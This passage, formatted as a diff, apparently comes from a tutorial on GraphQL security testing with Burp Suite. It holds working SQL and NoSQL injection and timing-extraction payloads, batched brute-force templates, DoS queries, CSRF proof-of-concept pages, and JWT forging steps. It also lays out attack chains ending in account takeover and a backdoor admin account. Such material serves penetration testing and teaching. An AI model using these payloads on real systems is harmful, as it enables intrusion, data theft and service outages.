+{"query": "query { nonExistentField }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Analyze the error response</strong>:</p>
+<ul>
+<li>Look for "Did you mean" suggestions in error messages</li>
+<li>Check for field names mentioned in error context</li>
+<li>Note any schema information leaked in the error messages</li>
+</ul>
+</li>
+<li>
+<p><strong>Iterate based on error information</strong>:</p>
+<ul>
+<li>Use revealed field names to craft new queries</li>
+<li>Try variations of suggested field names</li>
+<li>Build up a schema map based on error information</li>
+</ul>
+</li>
+</ol>
+<h4>3. Alias enumeration with Burp Repeater</h4>
+<p>We can use GraphQL aliases to test multiple potential fields in a single query:</p>
+<ol>
+<li>
+<p><strong>Create an aliased query</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"query": "query { 
+  a1: user { id name } 
+  a2: users { id name }
+  a3: accounts { id name }
+  a4: customers { id name }
+}"}
+</code></pre>
+</li>
+<li>
+<p><strong>Analyze the response</strong>:</p>
+<ul>
+<li>Valid fields will return data under their respective aliases</li>
+<li>Invalid fields will produce errors that can be matched to specific aliases</li>
+<li>Use this information to identify valid query fields</li>
+</ul>
+</li>
+</ol>
+<h3>Repository reconnaissance</h3>
+<p>For open source applications or those with public repositories, examining the codebase can reveal GraphQL schemas and resolvers:</p>
+<pre class="language-bash"><code class="language-bash"># Search for GraphQL schema files in a GitHub repository
+git clone https://github.com/target-organization/target-application.git
+cd target-application
+grep -r "type Query" --include="*.graphql" --include="*.js" --include="*.ts" .
+grep -r "extend type Query" --include="*.graphql" --include="*.js" --include="*.ts" .
+grep -r "gql\`" --include="*.js" --include="*.ts" .
+</code></pre>
+<p>Common files to look for include:</p>
+<ul>
+<li><code>schema.graphql</code> or <code>schema.gql</code></li>
+<li><code>*.typeDefs.js</code> or <code>*.typeDefs.ts</code></li>
+<li>JavaScript/TypeScript files with embedded GraphQL using tagged template literals</li>
+</ul>
+<h2>Exploiting GraphQL Vulnerabilities</h2>
+<p>Now that we understand how to map a GraphQL API, let's examine various attack vectors and exploitation techniques using Burp Suite.</p>
+<h3>Information Disclosure through Overfetching</h3>
+<p>Unlike REST APIs where each endpoint returns a fixed data structure, GraphQL allows clients to request exactly what they need. However, this flexibility means APIs that don't implement proper authorization checks at the field level can leak sensitive information.</p>
+<p>Consider this query:</p>
+<pre class="language-graphql"><code class="language-graphql">query GetUserProfile {
+  user(id: "1") {
+    username
+    email
+    profile {
+      firstName
+      lastName
+      socialSecurityNumber  # Sensitive field!
+      dateOfBirth
+      phoneNumber
+    }
+  }
+}
+</code></pre>
+<p>If authorization is only checked at the operation level (can the user access <code>user</code>?) but not at the field level (can the user access <code>socialSecurityNumber</code>?), sensitive information could be exposed.</p>
+<p>Testing for overfetching vulnerabilities with Burp Repeater:</p>
+<ol>
+<li>
+<p><strong>Create a base query for a resource</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+Authorization: Bearer YOUR_TOKEN
+
+{"query": "query { user(id: \"1\") { id username email } }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Incrementally add potentially sensitive fields</strong>:</p>
+<ul>
+<li>Start with fields that are likely to exist but not shown in the UI</li>
+<li>Add fields like <code>password</code>, <code>resetToken</code>, <code>role</code>, <code>permissions</code>, etc.</li>
+<li>Try nested fields like <code>profile { socialSecurityNumber }</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Analyze responses for sensitive data exposure</strong>:</p>
+<ul>
+<li>Look for fields that return actual values instead of null or errors</li>
+<li>Compare the results with what's available in the application UI</li>
+<li>Note any sensitive data that shouldn't be accessible to your user role</li>
+</ul>
+</li>
+</ol>
+<p>This manual approach allows you to carefully analyze each response and detect subtle information leakage.</p>
+<h3>GraphQL Injection</h3>
+<p>GraphQL is vulnerable to injection attacks similar to SQL injection. These occur when user-supplied input is not properly sanitized before being used in resolver functions.</p>
+<h4>SQL Injection via GraphQL</h4>
+<p>Consider a resolver implemented like this in Node.js:</p>
+<pre class="language-javascript"><code class="language-javascript">const resolvers = {
+  Query: {
+    user: async (_, { username }) => {
+      // VULNERABILITY: Directly interpolating user input into SQL query
+      const query = `SELECT * FROM users WHERE username = '${username}'`;
+      return await db.raw(query);
+    }
+  }
+};
+</code></pre>
+<p>This resolver is vulnerable to SQL injection. An attacker could exploit it with a query like:</p>
+<pre class="language-graphql"><code class="language-graphql">query {
+  user(username: "admin' OR 1=1 --") {
+    id
+    username
+    email
+  }
+}
+</code></pre>
+<p>At the database level, this would execute:</p>
+<pre class="language-sql"><code class="language-sql">SELECT * FROM users WHERE username = 'admin' OR 1=1 --'
+</code></pre>
+<p>The <code>OR 1=1</code> condition ensures the query returns all users, potentially leaking information about other accounts.</p>
+<p>Testing for SQL injection in GraphQL with Burp Suite:</p>
+<ol>
+<li>
+<p><strong>Identify injectable parameters</strong>:</p>
+<ul>
+<li>Create a request in Burp Repeater targeting a GraphQL query that accepts user input</li>
+<li>Example: <code>{"query": "query { user(username: \"admin\") { id username email } }"}</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Test for SQL injection with Burp Repeater</strong>:</p>
+<ul>
+<li>Modify the parameter to include SQL injection payloads:
+<ul>
+<li><code>{"query": "query { user(username: \"admin' OR 1=1 --\") { id username email } }"}</code></li>
+<li><code>{"query": "query { user(username: \"admin\\\" OR \\\"1\\\"=\\\"1\") { id username email } }"}</code></li>
+<li><code>{"query": "query { user(username: \"' UNION SELECT 1,username,password FROM users --\") { id username email } }"}</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Use Burp Intruder for systematic testing</strong>:</p>
+<ul>
+<li>Send your request to Intruder</li>
+<li>Set the position around the injection point: <code>{"query": "query { user(username: \"§admin§\") { id username email } }"}</code></li>
+<li>Use a list of SQL injection payloads from Burp's built-in payload options</li>
+<li>Add grep match rules to identify successful injections (look for multiple records, error messages, etc.)</li>
+</ul>
+</li>
+<li>
+<p><strong>Analyze the results</strong>:</p>
+<ul>
+<li>Look for responses with different lengths or content</li>
+<li>Check for database error messages that leak information</li>
+<li>Verify if any payloads return more data than expected (indicating successful injection)</li>
+</ul>
+</li>
+</ol>
+<h4>NoSQL Injection</h4>
+<p>GraphQL APIs built on NoSQL databases like MongoDB are vulnerable to NoSQL injection attacks:</p>
+<pre class="language-javascript"><code class="language-javascript">// Vulnerable resolver using MongoDB
+const resolvers = {
+  Query: {
+    user: async (_, { username }) => {
+      // VULNERABILITY: Directly using user input in query object
+      return await UserCollection.findOne({ username: username });
+    }
+  }
+};
+</code></pre>
+<p>If the input isn't properly validated, an attacker could send:</p>
+<pre class="language-graphql"><code class="language-graphql">query {
+  user(username: {$ne: null}) {
+    id
+    username
+    email
+  }
+}
+</code></pre>
+<p>In MongoDB, this would translate to finding a user where the username is not equal to null—essentially returning the first user in the database.</p>
+<p>Testing for NoSQL injection with Burp Suite:</p>
+<ol>
+<li>
+<p><strong>Create a base request in Burp Repeater</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"query": "query { user(username: \"admin\") { id username email } }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Test NoSQL operator injections</strong>:</p>
+<ul>
+<li>Replace the parameter value with NoSQL operators:
+<ul>
+<li><code>{"query": "query { user(username: {\"$ne\": null}) { id username email } }"}</code></li>
+<li><code>{"query": "query { user(username: {\"$regex\": \"^adm\"}) { id username email } }"}</code></li>
+<li><code>{"query": "query { user(username: {\"$gt\": \"\"}) { id username email } }"}</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Use Burp Intruder for more comprehensive testing</strong>:</p>
+<ul>
+<li>Set up positions around the parameter value</li>
+<li>Use a list of NoSQL injection payloads</li>
+<li>Configure grep match rules to identify successful injections</li>
+</ul>
+</li>
+<li>
+<p><strong>Analyze results</strong>:</p>
+<ul>
+<li>Look for responses that return data when they shouldn't</li>
+<li>Check for different error messages that reveal information about the database</li>
+<li>Verify if operators like <code>$ne</code> or <code>$regex</code> work, indicating NoSQL injection vulnerabilities</li>
+</ul>
+</li>
+</ol>
+<h3>Batching Attacks</h3>
+<p>GraphQL allows sending multiple operations in a single request, which can be abused for various attacks:</p>
+<pre class="language-graphql"><code class="language-graphql">[
+  { 
+    "query": "query { user(id: \"1\") { id username } }"
+  },
+  {
+    "query": "query { user(id: \"2\") { id username } }"
+  },
+  {
+    "query": "query { user(id: \"3\") { id username } }"
+  }
+  // ... hundreds more queries
+]
+</code></pre>
+<p>This can be used for:</p>
+<ol>
+<li><strong>Rate limit bypass</strong>: If rate limiting is implemented per-request rather than per-operation</li>
+<li><strong>Brute force attacks</strong>: Testing many different values in a single request</li>
+<li><strong>Resource exhaustion</strong>: Overwhelming the server with many operations</li>
+</ol>
+<p>Testing batching attacks with Burp Suite:</p>
+<ol>
+<li>
+<p><strong>Create a batch request template in Burp Repeater</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+[
+  {"query": "query { user(id: \"1\") { id username } }"},
+  {"query": "query { user(id: \"2\") { id username } }"}
+]
+</code></pre>
+</li>
+<li>
+<p><strong>Testing rate limit bypass</strong>:</p>
+<ul>
+<li>Add more queries to the batch to see if you can make more queries than normally allowed</li>
+<li>Monitor for rate limit error messages</li>
+<li>If no errors occur, the API may be vulnerable to rate limit bypassing</li>
+</ul>
+</li>
+<li>
+<p><strong>Brute force attacks with Burp Intruder</strong>:</p>
+<ul>
+<li>For password brute forcing, create a batch template like:
+<pre class="language-none"><code class="language-none">[
+  {"query": "mutation { login(username: \"admin\", password: \"§password§\") { token } }"},
+  {"query": "mutation { login(username: \"admin\", password: \"§password2§\") { token } }"},
+  {"query": "mutation { login(username: \"admin\", password: \"§password3§\") { token } }"}
+]
+</code></pre>
+</li>
+<li>Send to Intruder and configure Cluster Bomb attack type</li>
+<li>Set payloads for each position from your password list</li>
+<li>Configure grep patterns to identify successful logins</li>
+</ul>
+</li>
+<li>
+<p><strong>Resource exhaustion testing</strong>:</p>
+<ul>
+<li>Create a batch with increasingly complex or numerous queries</li>
+<li>Monitor server response times and errors</li>
+<li>Gradually increase the load until you observe performance degradation</li>
+</ul>
+</li>
+</ol>
+<h3>Denial of Service (DoS) Attacks</h3>
+<p>GraphQL's flexibility makes it particularly vulnerable to DoS attacks. Let's examine how to test these using Burp Suite:</p>
+<h4>Nested Query Attacks</h4>
+<p>GraphQL allows deeply nested queries that can cause exponential performance degradation:</p>
+<pre class="language-graphql"><code class="language-graphql">query NestedFriends {
+  user(id: "1") {
+    friends {
+      friends {
+        friends {
+          friends {
+            friends {
+              friends {
+                # And so on...
+    name
+    email
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<p>If each user has multiple friends, this query can cause an exponential explosion in the number of resolver executions, similar to the classic billion laughs XML attack.</p>
+<p>Testing for nested query vulnerabilities with Burp Repeater:</p>
+<ol>
+<li>
+<p><strong>Create a base query with a potential cyclic relationship</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"query": "query { user(id: \"1\") { friends { name } } }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Incrementally add nesting levels and observe response times</strong>:</p>
+<ul>
+<li>Add one level of nesting at a time</li>
+<li>Measure the response time for each level</li>
+<li>Look for exponential increases in response time</li>
+</ul>
+</li>
+<li>
+<p><strong>Find the breaking point</strong>:</p>
+<ul>
+<li>Continue adding nesting levels until:
+<ul>
+<li>The request times out</li>
+<li>The server returns an error</li>
+<li>The response time becomes unreasonably long</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Document your findings</strong>:</p>
+<ul>
+<li>Note the nesting level where performance degrades significantly</li>
+<li>Record the response time pattern (linear vs. exponential growth)</li>
+<li>Save the query that demonstrates the vulnerability</li>
+</ul>
+</li>
+</ol>
+<h4>Field Duplication Attacks</h4>
+<p>Another DoS technique involves duplicating fields many times:</p>
+<pre class="language-graphql"><code class="language-graphql">query DuplicatedFields {
+  user(id: "1") {
+    username
+    email
+    username
+    email
+    username
+    email
+    # Repeated thousands of times
+  }
+}
+</code></pre>
+<p>Some GraphQL implementations process each field instance separately, causing performance issues with enough duplication.</p>
+<p>Testing field duplication with Burp Repeater:</p>
+<ol>
+<li>
+<p><strong>Create a base query in Burp Repeater</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"query": "query { user(id: \"1\") { username email } }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Use Burp's text editor to duplicate fields</strong>:</p>
+<ul>
+<li>Copy and paste the fields multiple times</li>
+<li>Start with 10 duplications, then 100, then 1000, etc.</li>
+<li>Observe the response time for each test</li>
+</ul>
+</li>
+<li>
+<p><strong>Create a request that triggers the vulnerability</strong>:</p>
+<ul>
+<li>Find the number of duplications that causes significant slowdown</li>
+<li>Document the performance impact</li>
+</ul>
+</li>
+</ol>
+<h4>Resource-Intensive Operations</h4>
+<p>Attackers can target resource-intensive operations within the API:</p>
+<pre class="language-graphql"><code class="language-graphql">query ExpensiveOperations {
+  searchProducts(query: "a") {
+    # Full-text search operation
+    id
+    name
+    price
+  }
+  
+  geoSearch(lat: 37.7749, lng: -122.4194, radius: 100) {
+    # Geospatial search operation
+    id
+    name
+    distance
+  }
+}
+</code></pre>
+<p>By combining multiple expensive operations or using very permissive search parameters, attackers can overload the server.</p>
+<p>Testing resource-intensive operations with Burp Repeater:</p>
+<ol>
+<li>
+<p><strong>Identify potentially expensive operations</strong>:</p>
+<ul>
+<li>Look for operations involving:
+<ul>
+<li>Search functionality</li>
+<li>Filtering large datasets</li>
+<li>Geospatial queries</li>
+<li>Data aggregation</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Test with Burp Repeater using minimal parameters</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"query": "query { searchProducts(query: \"\") { id name description } }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Modify parameters to maximize resource usage</strong>:</p>
+<ul>
+<li>Use very broad search terms ("a", "e", etc.)</li>
+<li>Request large result sets</li>
+<li>Combine multiple resource-intensive operations in one query</li>
+</ul>
+</li>
+<li>
+<p><strong>Measure and document the impact</strong>:</p>
+<ul>
+<li>Note response times</li>
+<li>Watch for server errors or timeouts</li>
+<li>Identify operations that cause the most significant performance degradation</li>
+</ul>
+</li>
+</ol>
+<h3>Authorization Bypass</h3>
+<p>GraphQL has unique authorization challenges due to its flexible query structure. Here's how to test for these issues with Burp Suite:</p>
+<h4>Object-Level vs. Field-Level Authorization</h4>
+<p>Many GraphQL implementations check authorization at the object level but not at the field level:</p>
+<pre class="language-graphql"><code class="language-graphql">query {
+  # Authorized at object level
+  currentUser {
+    username
+    email
+    # Field-level authorization missing
+    role
+    permissions
+  }
+}
+</code></pre>
+<p>If the API only checks whether the user can access the <code>currentUser</code> object but doesn't verify access to specific fields like <code>role</code> or <code>permissions</code>, sensitive data might be exposed.</p>
+<p>Testing field-level authorization with Burp Repeater:</p>
+<ol>
+<li>
+<p><strong>Authenticate with different user accounts</strong>:</p>
+<ul>
+<li>Create users with different permission levels (admin, regular user, etc.)</li>
+<li>Obtain authorization tokens for each user</li>
+</ul>
+</li>
+<li>
+<p><strong>Create a query that requests sensitive fields</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+Authorization: Bearer REGULAR_USER_TOKEN
+
+{"query": "query { currentUser { username email role permissions adminSettings } }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Analyze the response</strong>:</p>
+<ul>
+<li>Check if sensitive fields are returned despite insufficient privileges</li>
+<li>Note which fields are properly protected and which are not</li>
+</ul>
+</li>
+<li>
+<p><strong>Compare with admin-level access</strong>:</p>
+<ul>
+<li>Switch the token to an admin user</li>
+<li>Run the same query and compare results</li>
+<li>Document any fields that should only be visible to admins but are exposed to regular users</li>
+</ul>
+</li>
+</ol>
+<h4>Unauthorized Mutations via Fragments</h4>
+<p>Fragment abuse can sometimes bypass authorization:</p>
+<pre class="language-graphql"><code class="language-graphql">mutation {
+  updateUser(id: "1", input: {
+    email: "hacker@evil.com"
+  }) {
+    ...AdminFields
+  }
+}
+
+fragment AdminFields on User {
+  id
+  role
+}
+</code></pre>
+<p>If the API doesn't properly check authorization for fragment fields separately from the main query, an attacker might gain access to restricted data.</p>
+<p>Testing fragment-based authorization bypass with Burp Repeater:</p>
+<ol>
+<li>
+<p><strong>Identify a mutation that returns user data</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+Authorization: Bearer USER_TOKEN
+
+{"query": "mutation { updateUser(id: \"1\", input: { name: \"Test User\" }) { id name } }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Add a fragment requesting sensitive fields</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+Authorization: Bearer USER_TOKEN
+
+{"query": "mutation { updateUser(id: \"1\", input: { name: \"Test User\" }) { id name ...AdminFields } } fragment AdminFields on User { role permissions adminSettings }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Analyze the response</strong>:</p>
+<ul>
+<li>Check if the fragment fields are returned despite insufficient privileges</li>
+<li>Verify if authorization checks handle fragments properly</li>
+</ul>
+</li>
+</ol>
+<h3>CSRF Vulnerabilities in GraphQL</h3>
+<p>Cross-Site Request Forgery (CSRF) vulnerabilities occur when GraphQL endpoints don't properly verify that requests are intentional. Unlike traditional REST APIs where each endpoint can have its own CSRF protection, GraphQL typically uses a single endpoint for all operations, complicating CSRF defenses.</p>
+<h4>CSRF via GET Requests</h4>
+<p>While GraphQL operations are typically submitted via POST requests, some implementations also support GET requests with the query in URL parameters:</p>
+<pre class="language-none"><code class="language-none">https://api.example.com/graphql?query=mutation{createUser(username:"malicious",role:"admin"){id}}
+</code></pre>
+<p>If the API accepts GET requests and relies solely on cookies for authentication, it may be vulnerable to CSRF attacks. An attacker could create a malicious website that triggers this request:</p>
+<pre class="language-html"><code class="language-html">&#x3C;img src="https://api.example.com/graphql?query=mutation{createUser(username:'attacker',role:'admin'){id}}" style="display:none">
+</code></pre>
+<p>When a victim with an active session visits this page, their browser automatically includes their authentication cookies, potentially executing the mutation.</p>
+<p>Testing for GET-based CSRF with Burp Repeater:</p>
+<ol>
+<li>
+<p><strong>Test if GET requests are supported</strong>:</p>
+<ul>
+<li>Create a simple GraphQL query in Burp Repeater</li>
+<li>Convert it from POST to GET by moving the query to URL parameters:
+<pre class="language-none"><code class="language-none">GET /graphql?query=query{__typename} HTTP/1.1
+Host: example.com
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Test mutations via GET</strong>:</p>
+<ul>
+<li>If GET requests work, try a mutation via GET:
+<pre class="language-none"><code class="language-none">GET /graphql?query=mutation{createUser(username:"test",role:"user"){id}} HTTP/1.1
+Host: example.com
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Create a CSRF PoC HTML page</strong>:</p>
+<ul>
+<li>If mutations via GET work, create a simple HTML page:
+<pre class="language-html"><code class="language-html">&#x3C;!DOCTYPE html>
+&#x3C;html>
+&#x3C;body>
+  &#x3C;h1>Test Page&#x3C;/h1>
+  &#x3C;img src="https://api.example.com/graphql?query=mutation{createUser(username:'csrf_test',role:'admin'){id}}" style="display:none">
+&#x3C;/body>
+&#x3C;/html>
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Test the PoC</strong>:</p>
+<ul>
+<li>Save the HTML to a file</li>
+<li>Open it in a browser where you have an active session with the target site</li>
+<li>Check if the mutation executes successfully</li>
+</ul>
+</li>
+</ol>
+<p>For POST-based CSRF, you can test with a more sophisticated HTML form that submits automatically:</p>
+<pre class="language-html"><code class="language-html">&#x3C;!DOCTYPE html>
+&#x3C;html>
+&#x3C;body onload="document.forms[0].submit()">
+  &#x3C;form action="https://api.example.com/graphql" method="POST" enctype="text/plain">
+    &#x3C;input name='{"query":"mutation{createUser(username:' value='"csrf_test",role:"admin"){id}}"}' type="hidden">
+  &#x3C;/form>
+&#x3C;/body>
+&#x3C;/html>
+</code></pre>
+<h2>Advanced Attack Scenarios</h2>
+<p>Let's explore some complex attack chains that combine multiple GraphQL vulnerabilities to achieve significant security breaches. These scenarios can be tested manually using Burp Suite.</p>
+<h3>Scenario 1: Information Disclosure to Account Takeover</h3>
+<p>This attack chain demonstrates how GraphQL vulnerabilities can be combined to progress from initial information disclosure to full account takeover:</p>
+<ol>
+<li><strong>Initial Reconnaissance</strong>: The attacker uses introspection to discover the schema structure.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">query {
+  __schema {
+    types {
+      name
+      kind
+      fields {
+        name
+      }
+    }
+  }
+}
+</code></pre>
+<ol start="2">
+<li><strong>Identify User Query</strong>: The attacker discovers a <code>user</code> query that takes a username parameter.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">query {
+  user(username: "admin") {
+    id
+    username
+    email
+  }
+}
+</code></pre>
+<ol start="3">
+<li><strong>Exploiting Over-fetching</strong>: The attacker discovers they can request additional fields beyond what the UI normally shows.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">query {
+  user(username: "admin") {
+    id
+    username
+    email
+    resetToken  # Sensitive field not intended for user access
+    lastLogin
+    role
+  }
+}
+</code></pre>
+<ol start="4">
+<li><strong>Enumerating Users</strong>: The attacker uses batching to efficiently enumerate valid usernames.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">[
+  { "query": "query { user(username: \"admin\") { id } }" },
+  { "query": "query { user(username: \"john\") { id } }" },
+  { "query": "query { user(username: \"sarah\") { id } }" },
+  # ... many more
+]
+</code></pre>
+<ol start="5">
+<li><strong>SQL Injection to Retrieve Password Hashes</strong>: The attacker discovers a SQL injection vulnerability in the user query.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">query {
+  user(username: "admin' UNION SELECT id, username, password_hash as email, 'token' as resetToken FROM users --") {
+    id
+    username
+    email  # This will contain password hashes
+    resetToken
+  }
+}
+</code></pre>
+<ol start="6">
+<li><strong>Password Reset Manipulation</strong>: Using the discovered SQL injection, the attacker manages to reset a user's password by manipulating the resetToken field.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">mutation {
+  resetPassword(input: {
+    username: "admin",
+    token: "STOLEN_OR_GENERATED_TOKEN",
+    newPassword: "hacked_password"
+  }) {
+    success
+  }
+}
+</code></pre>
+<ol start="7">
+<li><strong>Account Takeover</strong>: With the password reset, the attacker now has full control of the admin account.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">mutation {
+  login(username: "admin", password: "hacked_password") {
+    token
+    user {
+      id
+      role
+    }
+  }
+}
+</code></pre>
+<h3>Scenario 2: DoS to Data Exfiltration</h3>
+<p>This attack chain shows how DoS techniques can be leveraged for data exfiltration:</p>
+<ol>
+<li><strong>Identifying Expensive Operations</strong>: The attacker identifies resource-intensive operations.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">query {
+  searchProducts(keyword: "") {  # Empty search returns all products
+    id
+    name
+    price
+  }
+}
+</code></pre>
+<ol start="2">
+<li><strong>Creating DoS Conditions</strong>: The attacker creates a nested query that puts significant load on the server.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">query {
+  categories {
+    products(first: 1000) {
+      reviews(first: 1000) {
+        user {
+          posts(first: 1000) {
+            comments(first: 1000) {
+              id
+            }
+          }
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<ol start="3">
+<li><strong>Timing Attack Preparation</strong>: While the server is under heavy load, the attacker prepares timing-based attacks to extract data.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">query {
+  # First, create heavy load
+  search1: searchProducts(keyword: "") { id }
+  
+  # Then attempt a timing attack
+  user(username: "admin' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END from users where username='admin') --") {
+    id
+  }
+}
+</code></pre>
+<ol start="4">
+<li><strong>Manual Timing Attack Execution</strong>:
+<ul>
+<li>Configure Burp Repeater to send a request containing both a DoS component and an SQL injection with timing components</li>
+<li>Send requests with different character guesses (a-z, 0-9)</li>
+<li>Measure the response time for each character</li>
+<li>When response time is significantly longer, you've identified the correct character</li>
+<li>Repeat for each position in the target data</li>
+</ul>
+</li>
+</ol>
+<h3>Scenario 3: Chaining Multiple Vulnerabilities for Privilege Escalation</h3>
+<p>This attack chain demonstrates a sophisticated privilege escalation:</p>
+<ol>
+<li><strong>Initial Access</strong>: The attacker starts with a low-privileged account.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">mutation {
+  login(username: "regular_user", password: "password123") {
+    token
+  }
+}
+</code></pre>
+<ol start="2">
+<li><strong>Information Gathering</strong>: The attacker uses overfetching to discover admin accounts.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">query {
+  users {
+    id
+    username
+    role
+    email
+  }
+}
+</code></pre>
+<ol start="3">
+<li><strong>Exploiting Broken Authentication</strong>: The attacker finds a manipulation vulnerability in the login mutation.</li>
+</ol>
+<pre class="language-graphql"><code class="language-graphql">mutation {
+  login(username: "regular_user", password: "password123") {
+    token
+    # Forcing fields that might not be properly protected
+    user {
+      id
+      role
+      permissions
+    }
+  }
+}
+</code></pre>
+<ol start="4">
+<li>
+<p><strong>JWT Analysis</strong>:</p>
+<ul>
+<li>Use the JWT token from the response</li>
+<li>Decode it using Burp's JWT Editor extension or an online tool like jwt.io</li>
+<li>Examine the payload for editable claims:
+<pre class="language-javascript"><code class="language-javascript">// Decoded JWT payload
+{
+  "sub": "123",
+  "username": "regular_user",
+  "role": "user",
+  "iat": 1650000000,
+  "exp": 1650086400
+}
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>JWT Manipulation</strong>:</p>
+<ul>
+<li>If the token uses a weak algorithm (like HS256), attempt to modify the role claim</li>
+<li>Try common secrets using Burp's JWT Editor extension</li>
+<li>If successful, you'll get a new token with admin privileges</li>
+</ul>
+</li>
+<li>
+<p><strong>Testing Privileged Access</strong>:</p>
+<ul>
+<li>Use the forged token in Burp Repeater</li>
+<li>Attempt to access admin-only functionality:
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+Authorization: Bearer FORGED_TOKEN
+
+{"query": "mutation { deleteUser(id: \"456\") { success } }"}
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Creating Backdoor Account</strong>:</p>
+<ul>
+<li>If the forged token works, create a new admin account for persistent access:
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+Authorization: Bearer FORGED_TOKEN
+
+{"query": "mutation { createUser(input: { username: \"backup_admin\", password: \"evil_password\", email: \"attacker@evil.com\", role: \"admin\" }) { id role } }"}
+</code></pre>
+</li>
+</ul>
+</li>
+</ol>
+<h2>GraphQL Security Testing Tools</h2>
+<p>Several specialized tools can help test GraphQL security:</p>
+<h3>InQL</h3>
+<p>InQL is a Burp Suite extension specifically designed for GraphQL security testing:</p>
+<pre class="language-bash"><code class="language-bash"># Installing InQL Scanner CLI
+pip install inql
+
+# Running a basic scan
+inql -t https://api.example.com/graphql
+
+# Dumping schema and generating queries
+inql -t https://api.example.com/graphql -d schema_dump -g
+</code></pre>
+<h3>GraphQL Voyager</h3>
+<p>GraphQL Voyager creates visual representations of your schema, helping identify security issues:</p>
+<pre class="language-bash"><code class="language-bash"># Installing GraphQL Voyager
+npm install -g graphql-voyager
+
+# Usage with a local schema file
+voyager --url https://api.example.com/graphql
+</code></pre>
+<h3>Altair GraphQL Client</h3>
+<p>Altair provides a sophisticated interface for GraphQL testing:</p>
+<pre class="language-bash"><code class="language-bash"># Installing Altair CLI
+npm install -g altair-graphql-client
+
+# Running Altair
+altair
+</code></pre>
+<h3>Custom Security Testing with Burp Suite</h3>
+<p>For comprehensive security testing, you can leverage Burp Suite Professional's built-in tools:</p>
+<h4>1. Setting up a GraphQL testing project in Burp Suite</h4>
+<ol>
+<li>
+<p><strong>Create a new Burp project</strong>:</p>
+<ul>
+<li>Launch Burp Suite Professional</li>
+<li>Create a new project dedicated to GraphQL testing</li>
+<li>Configure your browser to proxy through Burp (default: 127.0.0.1:8080)</li>
+</ul>
+</li>
+<li>
+<p><strong>Install GraphQL-specific extensions</strong>:</p>
+<ul>
+<li>Go to the "Extensions" tab</li>
+<li>Browse the BApp Store</li>
+<li>Install "InQL - Introspection GraphQL Scanner"</li>
+<li>Install "GraphQL Raider" if available</li>
+<li>Install "JSON Web Tokens" for testing JWT authentication</li>
+</ul>
+</li>
+<li>
+<p><strong>Configure target scope</strong>:</p>
+<ul>
+<li>In the "Target" tab, add the GraphQL API endpoint to scope</li>
+<li>Configure appropriate exclusions for any irrelevant paths</li>
+</ul>
+</li>
+</ol>
+<h4>2. Systematically testing for vulnerabilities</h4>
+<p>Create a testing checklist in Burp Suite:</p>
+<ol>
+<li>
+<p><strong>Reconnaissance phase</strong>:</p>
+<ul>
+<li>Use InQL to perform introspection and map the schema</li>
+<li>Save discovered queries and mutations for later testing</li>
+<li>Document sensitive fields and operations</li>
+</ul>
+</li>
+<li>
+<p><strong>Authentication testing</strong>:</p>
+<ul>
+<li>Test JWT tokens using the JWT Editor</li>
+<li>Check for token tampering vulnerabilities</li>
+<li>Verify token signature validation</li>
+</ul>
+</li>
+<li>
